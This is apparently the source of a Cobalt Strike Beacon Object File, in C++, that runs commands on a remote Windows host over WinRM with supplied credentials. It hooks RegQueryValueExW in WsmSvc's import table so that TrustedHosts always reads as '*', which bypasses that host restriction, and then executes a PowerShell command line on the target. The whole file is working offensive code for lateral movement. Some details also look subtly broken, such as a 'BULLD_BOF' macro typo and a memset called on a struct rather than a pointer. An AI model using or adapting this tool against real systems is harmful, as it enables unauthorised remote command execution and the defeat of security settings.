#include "winrmsh.h"

#ifdef BULLD_BOF
__attribute__((section(".data")))
#endif
GlobalData* globals;

const char* usage_message = "Usage: [-s shell_path] -r http://ip:5985 -u user -p pass [-c cmdline]";

bool output_extend_buffer(int length)
{
    const size_t max_size = 4096 * 1024;
    int new_cap = globals->output.capacity;
    while (globals->output.length + length > new_cap) {
        new_cap *= 2;
        if ((size_t)new_cap > max_size)
            return false;
    }
    char* bigger_buffer = (char*)malloc((size_t)new_cap * 2);
    if (!bigger_buffer) {
        return false;
    }
    memcpy(bigger_buffer, globals->output.data, globals->output.length);
    free(globals->output.data);
    globals->output.data = bigger_buffer;
    globals->output.capacity = new_cap;
    return true;
}

void write_output(const void* data, int length)
{
    if (!data || length == 0)
        return;

    if (globals->output.length + length > globals->output.capacity) {
        if (!output_extend_buffer(length)) {
            return;
        }
    }
    memcpy(globals->output.data + globals->output.length, data, length);
    globals->output.length += length;
}

void flush_output(bool show = true)
{
    if (globals->output.length == 0) {
        return;
    }
#ifdef BUILD_BOF
    BeaconOutput(CALLBACK_OUTPUT, globals->output.data, globals->output.length);
#else
    fwrite(globals->output.data, 1, globals->output.length, stdout);
#endif
    globals->output.length = 0;
}

#ifndef BUILD_BOF

void dprintf(const char* format, ...)
{
    va_list args;
    va_start(args, format);
    vprintf(format, args);
    va_end(args);
    putchar('\n');
}

#endif

LSTATUS
APIENTRY
Fake_RegQueryValueExW(
    HKEY hKey,
    LPCWSTR lpValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
)
{
    bool hit = false;

    /*
    if (lpValueName && wcscmp(lpValueName, L"allow_unencrypted") == 0) {
        *lpType = REG_DWORD;
        *reinterpret_cast<DWORD*>(lpData) = 1;
        *lpcbData = 4;
        hit = true;
    }
    */
    if (lpValueName && wcscmp(lpValueName, L"trusted_hosts") == 0) {
        printf("[+] Always set TrustedHosts = '*'");
        *lpType = REG_SZ;
        auto* buf = reinterpret_cast<wchar_t*>(lpData);
        buf[0] = L'*';
        buf[1] = 0;
        *lpcbData = 2;
        hit = true;
    }

    if (hit) {
        return NO_ERROR;
    }

    return globals->Real_RegQueryValueExW(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);
}

void CALLBACK WSManShellCompletionFunction(
    PVOID operationContext,                              // user defined context
    DWORD flags,                                         // one or more flags from WSManCallbackFlags
    _In_ WSMAN_ERROR* error,                             // error allocated and owned by the winrm stack; valid in the callback only;
    _In_ WSMAN_SHELL_HANDLE shell,                       // shell handle associated with the user context; must be closed using WSManCloseShell 
    _In_opt_ WSMAN_COMMAND_HANDLE command,               // command handle associated with the user context; must be closed using WSManCloseCommand  
    _In_opt_ WSMAN_OPERATION_HANDLE operationHandle,     // valid only for Send/Receive/Signal operations; must be closed using WSManCloseOperation  
    _In_opt_ WSMAN_RECEIVE_DATA_RESULT* data             // output data from command/shell; allocated internally and owned by the winrm stack
)
{
    auto* ctx = reinterpret_cast<WinRMContext*>(operationContext);
    ctx->errors[0] = error->code;
    SetEvent(ctx->events[0]);
}

void CALLBACK WSManShellOutputCallback(
    PVOID operationContext,                              // user defined context
    DWORD flags,                                         // one or more flags from WSManCallbackFlags
    _In_ WSMAN_ERROR* error,                             // error allocated and owned by the winrm stack; valid in the callback only;
    _In_ WSMAN_SHELL_HANDLE shell,                       // shell handle associated with the user context; must be closed using WSManCloseShell 
    _In_opt_ WSMAN_COMMAND_HANDLE command,               // command handle associated with the user context; must be closed using WSManCloseCommand  
    _In_opt_ WSMAN_OPERATION_HANDLE operationHandle,     // valid only for Send/Receive/Signal operations; must be closed using WSManCloseOperation  
    _In_opt_ WSMAN_RECEIVE_DATA_RESULT* data             // output data from command/shell; allocated internally and owned by the winrm stack
)
{
    auto* ctx = reinterpret_cast<WinRMContext*>(operationContext);
    ctx->errors[1] = error->code;
    if (error->code == 0 && data) {
        write_output(data->streamData.binaryData.data, data->streamData.binaryData.dataLength);
    }
    SetEvent(ctx->events[1]);
}

WinRMContext* winrm_init()
{
    DWORD status;
    WinRMContext* ctx;
    char addr_text[20];

    ctx = (WinRMContext*)malloc(sizeof(WinRMContext));
    snprintf(addr_text, 20, "%p", ctx);

    if (!ctx) {
        errorf("Failed to load WinRMContext!");
        return nullptr;
    }

    status = WSManInitialize(0, &ctx->api);
    if (status != 0) {
        goto _ERROR;
    }

    ctx->session = nullptr;
    ctx->shell = nullptr;
    ctx->command = nullptr;
    ctx->operation = nullptr;
    ctx->events[0] = CreateEventA(nullptr, false, false, nullptr);
    ctx->events[1] = CreateEventA(nullptr, false, false, nullptr);
    ctx->async[0].completionFunction = WSManShellCompletionFunction;
    ctx->async[0].operationContext = ctx;
    ctx->async[1].completionFunction = WSManShellOutputCallback;
    ctx->async[1].operationContext = ctx;

    if (ctx->events[0] && ctx->events[1]) {
        return ctx;
    }

_ERROR:
    free(ctx);
    return nullptr;
}

bool winrm_wait(WinRMContext* ctx, int index, unsigned timeout, const char* errfmt)
{
    if (WaitForSingleObject(ctx->events[index], timeout) == WAIT_TIMEOUT) {
        errorf("Wait for %s timeout", errfmt);
        return false;
    }
    else if (ctx->errors[index] != 0) {
        errorf("%s failed with %lx", errfmt, ctx->errors[index]);
        return false;
    }
    return true;
}

bool winrm_connect(
    WinRMContext* ctx,
    const wchar_t* uri,
    const wchar_t* username,
    const wchar_t* password)
{
    DWORD status;
    WSMAN_AUTHENTICATION_CREDENTIALS cred;

    cred.authenticationMechanism = WSMAN_FLAG_AUTH_NEGOTIATE;
    cred.userAccount.username = username;
    cred.userAccount.password = password;
    status = WSManCreateSession(ctx->api, uri, 0, &cred, nullptr, &ctx->session);
    if (status != 0) {
        errorf("WSManCreateSession() failed with %lx", status);
        return false;
    }

    WSManCreateShell(ctx->session, 0, L"http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd", 0, 0, nullptr, &ctx->async[0], &ctx->shell);
    if (!winrm_wait(ctx, 0, 5000, "WSManCreateShell"))
        return false;

    WSManRunShellCommand(ctx->shell, 0, globals->shell, nullptr, nullptr, &ctx->async[0], &ctx->command);
    if (!winrm_wait(ctx, 0, 5000, "WSManRunShellCommand"))
        return false;
    return true;
}

bool winrm_get_output(WinRMContext* ctx)
{
    WSMAN_OPERATION_HANDLE oper = nullptr;
    WSManReceiveShellOutput(ctx->shell, ctx->command, 0, nullptr, &ctx->async[1], &oper);
    if (!winrm_wait(ctx, 1, 5000, "WSManReceiveShellOutput")) {
        return false;
    }
    WSManCloseOperation(oper, 0);
    return true;
}

bool winrm_execute(WinRMContext* ctx, const char* cmd)
{
    WSMAN_DATA data;
    WSMAN_OPERATION_HANDLE oper = nullptr;
    data.type = WSMAN_DATA_TYPE_BINARY;
    data.binaryData.data = (BYTE*)cmd;
    int len = 0;
    while (cmd[len])
        ++len;
    data.binaryData.dataLength = len;
    WSManSendShellInput(ctx->shell, ctx->command, 0, L"stdin", &data, false, &ctx->async[0], &oper);
    if (!winrm_wait(ctx, 0, 5000, "WSManSendShellInput")) {
        return false;
    }
    data.binaryData.data = (BYTE*)"\n";
    data.binaryData.dataLength = 1;
    WSManSendShellInput(ctx->shell, ctx->command, 0, L"stdin", &data, false, &ctx->async[0], &oper);
    if (!winrm_wait(ctx, 0, 5000, "WSManSendShellInput")) {
        return false;
    }
    flush_output();

    for (int i = 0; i < 1; ++i) {
        winrm_get_output(ctx);
    }

    flush_output();
    return true;
}

void winrm_release(WinRMContext* ctx)
{
    if (ctx->command) {
        WSManCloseCommand(ctx->command, 0, &ctx->async[0]);
        winrm_wait(ctx, 0, 1000, "WSManCloseCommand");
    }
    if (ctx->shell) {
        WSManCloseShell(ctx->shell, 0, &ctx->async[0]);
        winrm_wait(ctx, 0, 1000, "WSManCloseShell");
    }
    if (ctx->session)
        WSManCloseSession(ctx->session, 0);
    if (ctx->api)
        WSManDeinitialize(ctx->api, 0);
    if (ctx->events[0])
        CloseHandle(ctx->events[0]);
    if (ctx->events[1])
        CloseHandle(ctx->events[1]);
    free(ctx);
}

void Run()
{
    WinRMContext* ctx = winrm_init();
    if (!ctx)
        return;
    globals->ctx = ctx;

    if (!ctx->session) {
        if (winrm_connect(ctx, globals->url, globals->username, globals->password)) {
            printf("[+] Connected to %ls...", globals->url);
            int len = 0;
            while (globals->cmdline[len])
                ++len;
            if (len < 64) {
                char cmdline[70];
                if (WideCharToMultiByte(CP_ACP, 0, globals->cmdline, len + 1, cmdline, 70, nullptr, nullptr)) {
                    winrm_execute(ctx, cmdline);
                }
            }
            else {
                char* cmdline = (char*)malloc((size_t)len + 4);
                if (WideCharToMultiByte(CP_ACP, 0, globals->cmdline, len + 1, cmdline, len + 4, nullptr, nullptr)) {
                    winrm_execute(ctx, cmdline);
                }
                free(cmdline);
            }
        }
    }
    winrm_release(ctx);
}

void HookRun(void(*Callback)())
{
    void** iat_RegQueryValueExW = nullptr;
    IMAGE_THUNK_DATA* first_thunk = nullptr;
    auto* kernelbase = (char*)LoadLibraryW(L"kernelbase");
    if (!kernelbase) {
        errorf("Load kernelbase failed with %lx", GetLastError());
        return;
    }
    auto* wsmsvc = (char*)LoadLibraryW(L"WsmSvc");
    if (!wsmsvc) {
        errorf("Load WsmSvc failed with %lx", GetLastError());
        return;
    }
    globals->Real_RegQueryValueExW = (decltype(RegQueryValueExW)*)GetProcAddress((HMODULE)kernelbase, "RegQueryValueExW");

    auto* dosh = (IMAGE_DOS_HEADER*)(wsmsvc);
    auto* nth = (IMAGE_NT_HEADERS*)(wsmsvc + dosh->e_lfanew);
    auto* iid = (IMAGE_IMPORT_DESCRIPTOR*)(wsmsvc + nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (iid->Characteristics) {
        auto* name = wsmsvc + iid->Name;
        if (_stricmp(name, "api-ms-win-core-registry-l1-1-0.dll") == 0 ||
            _stricmp(name, "kernelbase.dll") == 0) {
            first_thunk = (IMAGE_THUNK_DATA*)(wsmsvc + iid->FirstThunk);
            break;
        }
        ++iid;
    }

    if (!first_thunk) {
        errorf("Could not get register module!");
        return;
    }

    while (first_thunk->u1.Function) {
        if ((void*)first_thunk->u1.Function == globals->Real_RegQueryValueExW) {
            iat_RegQueryValueExW = (void**)&first_thunk->u1.Function;
            break;
        }
        ++first_thunk;
    }

    if (!iat_RegQueryValueExW) {
        errorf("Could not get RegQueryValueExW!");
        return;
    }

    DWORD prot = PAGE_READONLY;
    if (VirtualProtect(iat_RegQueryValueExW, 8, PAGE_READWRITE, &prot)) {
        _InterlockedExchange((size_t*)iat_RegQueryValueExW, (size_t)Fake_RegQueryValueExW);
        Callback();
        _InterlockedExchange((size_t*)iat_RegQueryValueExW, (size_t)globals->Real_RegQueryValueExW);
        VirtualProtect(iat_RegQueryValueExW, 8, prot, &prot);
    }
}

bool parse_args(int argc, wchar_t** args, GlobalData* globals)
{
    for (int i = 0; i < argc; ++i) {
        const wchar_t* arg = args[i];
        if (arg[0] == L'-' && arg[1] != 0 && arg[2] == 0 && argc - i > 1) {
            switch (arg[1]) {
            case 'c':
                globals->cmdline = args[i + 1];
                break;
            case 's':
                globals->shell = args[i + 1];
                break;
            case 'u':
                globals->username = args[i + 1];
                break;
            case 'p':
                globals->password = args[i + 1];
                break;
            case 'r':
                globals->url = args[i + 1];
                break;
            default:
                errorf("Unknown option %ls", args[i]);
                return false;
            }
            ++i;
        }
        else {
            errorf("Bad option: '%ls'", args[i]);
            return false;
        }
    }
    if (!globals->shell || !globals->username || !globals->password || !globals->url || !globals->cmdline) {
        errorf("Missing required options");
        printf(usage_message);
        return false;
    }
    return true;
}

extern "C" void go(char* arg, int len)
{
    GlobalData g;
    wchar_t** args = nullptr;
    int argc = 0;

    if (len == 5 && arg[4] == 0 && *reinterpret_cast<unsigned*>(arg) == 0x6c6c756e) {
        printf(usage_message);
        return;
    }

    size_t buf_size = static_cast<size_t>(len) * 4;
    wchar_t* arg_buffer = (wchar_t*)malloc(buf_size);
    /*[[unlikely]]*/if (!arg_buffer) {
        return;
    }

    len = MultiByteToWideChar(CP_UTF8, 0, arg, len, arg_buffer, len);
    if (len < 1) {
        errorf("MultiByteToWideChar failed with %lx", GetLastError());
        return;
    }

    args = CommandLineToArgvW(arg_buffer, &argc);
    if (!args || !argc) {
        return;
    }

    memset(arg_buffer, 0, buf_size);
    free(arg_buffer);

    // Initialize global data
    memset(g, 0, sizeof(g));
    g.shell = (wchar_t*)L"powershell.exe";
    g.output.data = (char*)malloc(1024);
    g.output.capacity = 1024;
    globals = &g;

    // Parse arguments and store into global data
    if (parse_args(argc, args, globals)) {
        HookRun(Run);
    }

    // Release heap resources
    if (g.output.data) {
        memset(g.output.data, 0, g.output.capacity);
        free(g.output.data);
    }
    LocalFree(args);
}

#ifndef BUILD_BOF
int main(int argc, char** argv)
{
    auto* arg = GetCommandLineA();
    while (*arg && *arg++ != ' ');
    if (*arg) {
        go(arg, (int)strlen(arg) + 1);
    }
    else {
        go((char*)"null", 5);
    }
}
#endif
